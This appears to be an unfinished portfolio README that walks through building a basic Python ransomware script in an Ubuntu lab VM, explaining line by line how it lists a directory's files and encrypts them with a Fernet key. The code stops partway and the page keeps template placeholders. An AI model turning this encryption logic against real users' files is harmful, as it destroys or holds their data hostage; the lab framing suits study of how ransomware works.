# Ransomware
Deploying ransomware using Python

## Objective


As ransomware attacks have been on a steady upward trend, I wanted to take the time to understand one of the methods of carrying out a ransomware attacks.

### Skills Learned


- Advanced understanding of SIEM concepts and practical application.
- Python scripting
- Cryptography
- 


### Tools Used
[Bullet Points - Remove this afterwards]

- Python
  

## Steps

First we are going to spin up an Ubuntu VM

Next we will create a directory with several files that we are going to test our ransomware on.

So we insert into the CLI "mkdir ransomware" to create the directory and inside the directory, run "echo "file content" > filename.txt" a few times to create several files.

Next we will create the Python script file.

To make this project easier to read I will briefly notate each line of code seperated by "//" to explain its utility in the script.

First we have to include the shebang #! so that Linux runs the file as a script.

Import os // allows python to interact with the OS.

from cryptography.fernet import Fernet // 128bit AES

files = [] // This will create an empty list called files.

for file in os.listdir() // This is a for loop and will list all the files in the directory.

if os.path.isfile(file) // if object is a file add to encryption list

if file == "ransomware.py" or file == "thekey.key" : (next line)continue(next line) files.append(file) // This is seperating our script file that is in the same directory forom the file list we created earlier in the script.

print(files) // Will display the "files" list on the CLI.

ref: test print

key = Fernet.generate_key() // This will generate the encryption key.

with open("thekey.key", "wb") as thekey: // This line uses the open function to open the file in script in write mode and reference the variable as "thekey" throughout the script.

for file in files: // This is creating a loop for the file's in the files list created earlier.

with open(file, "rb") as thefile: // This line will open the file's in the list in read binary mode and assigned the alias "thefile".

contents = thefile.read() // we have now made contents a alias to the file.read

contents_encrypted = Fernet(key).encrypt(contents) // This line encrypt the contents with the Fernet key.

with open(file, "wb") as thefile: 



*Ref 1: Network Diagram*
